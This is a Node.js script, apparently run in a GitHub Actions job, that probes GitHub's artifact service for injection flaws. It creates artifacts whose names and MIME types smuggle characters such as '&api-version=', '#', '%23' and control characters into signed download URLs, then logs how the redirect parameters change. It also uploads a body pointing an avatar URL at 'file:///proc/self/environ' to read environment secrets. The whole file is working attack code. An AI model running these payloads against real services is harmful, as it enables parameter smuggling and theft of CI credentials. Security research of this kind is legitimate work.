import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const repo = process.env.GITHUB_REPOSITORY;
const runId = process.env.GITHUB_RUN_ID;
const token = process.env.GITHUB_TOKEN;
const body = Buffer.from(JSON.stringify({full_name: 'x/y', owner: {login: 'c', avatar_url: 'file:///proc/self/environ'}}));
const sha = (b) => createHash('sha256').update(b).digest('hex');

function req(url, method = 'GET', body2 = null, headers = {}) {
  return new Promise((resolve, reject) => {
    const target = new URL(url);
    const mod = target.protocol === 'https:' ? https : http;
    const r = mod.request(target, {method, headers, timeout: 25000}, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({status: res.statusCode, headers: res.headers, rawHeaders: res.rawHeaders, body: Buffer.concat(chunks)}));
    });
    r.on('error', reject);
    r.on('timeout', () => r.destroy(new Error('timeout')));
    if (body2) r.write(body2);
    r.end();
  });
}

async function publish(label, name, mime) {
  const rec = {label, nameB64: Buffer.from(name, 'utf8').toString('base64')};
  try {
    const extra = mime === undefined ? {} : {mimeType: StringValue.create({value: mime})};
    const created = await client.CreateArtifact({...ids, name, version: 7, ...extra});
    rec.create = Boolean(created.ok);
    if (!created.ok) { console.log('INJ', JSON.stringify(rec)); return; }
    await new BlobClient(created.signedUploadUrl).getBlockBlobClient().uploadData(body, {blobHTTPHeaders: {blobContentType: 'application/json'}});
    const fin = await client.FinalizeArtifact({...ids, name, size: String(body.length), hash: StringValue.create({value: `sha256:${sha(body)}`})});
    rec.fin = Boolean(fin.ok);
    rec.id = String(fin.artifactId || '');
    if (!fin.ok) { console.log('INJ', JSON.stringify(rec)); return; }
    const r = await req(`https://api.github.com/repos/${repo}/actions/artifacts/${rec.id}/zip`, 'GET', null, {
      Authorization: `Bearer ${token}`, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'repo-cassette-inj',
    });
    const loc = r.headers.location || '';
    rec.locRaw = loc.slice(0, 700);
    rec.locLen = loc.length;
    rec.hasHashRawInLoc = loc.includes('#');
    rec.hasAmpRawInLoc = loc.includes('&');
    rec.rsctRaw = loc.match(/[?&]rsct=([^&]*)/)?.[1] ?? null;
    rec.rscdRaw = loc.match(/[?&]rscd=([^&]*)/)?.[1] ?? null;
    try {
      const u = new URL(loc);
      rec.finalRscd = u.searchParams.get('rscd');
      rec.pickedParams = [...u.searchParams.keys()].sort();
      rec.pickedRsct = u.searchParams.get('rsct');
    } catch (e) { rec.urlErr = String(e.message).slice(0, 120); }
  } catch (e) { rec.err = String(e.message).slice(0, 250); }
  console.log('INJ', JSON.stringify(rec));
}

const t = `${runId}-${Date.now()}`;
const names = [
  ['hash', `inj#${t}`],
  ['question', `inj?${t}`],
  ['amp', `inj&x=1-${t}`],
  ['hash-pct', `inj%23${t}`],
  ['amp-pct', `inj%26${t}`],
  ['space', `inj ${t}`],
  ['space-hash', `inj #${t}`],
  ['quote', `inj"${t}`],
  ['semi', `inj;${t}`],
  ['slash', `inj/${t}`],
  ['backslash', `inj\\${t}`],
  ['nel', `inj\u0085${t}`],
  ['c1', `inj\u001c${t}`],
  ['ctrl85-ascii', `inj%85${t}`],
  ['dotdot', `inj..${t}`],
  ['zipname', `inj-${t}.zip`],
  ['jsonname', `inj-${t}.json`],
];
for (const [label, name] of names) await publish(`name-${label}`, name, 'application/json');

const mimes = [
  ['json', 'application/json'],
  ['amp', 'application/json&api-version=2012-02-12'],
  ['amp2', 'application/json%26api-version=2012-02-12'],
  ['hash', 'application/json#x'],
  ['q', 'application/json?x=1'],
  ['semi', 'application/json; charset=utf-8'],
  ['param', 'application/json;x=1'],
  ['upper', 'APPLICATION/JSON'],
  ['ws-lead', ' application/json'],
  ['ws-trail', 'application/json '],
  ['tab-trail', 'application/json\t'],
  ['nel-lead', '\u0085application/json'],
  ['nel-trail', 'application/json\u0085'],
  ['c1-lead', '\u001capplication/json'],
  ['comma', 'application/json,text/plain'],
  ['plus', 'application/json+x'],
  ['vnd', 'application/vnd.github.v3+json'],
  ['textjson', 'text/json'],
  ['xjson', 'application/x-json'],
];
for (const [label, mime] of mimes) await publish(`mime-${label}`, `injmime-${label}-${t}`, mime);
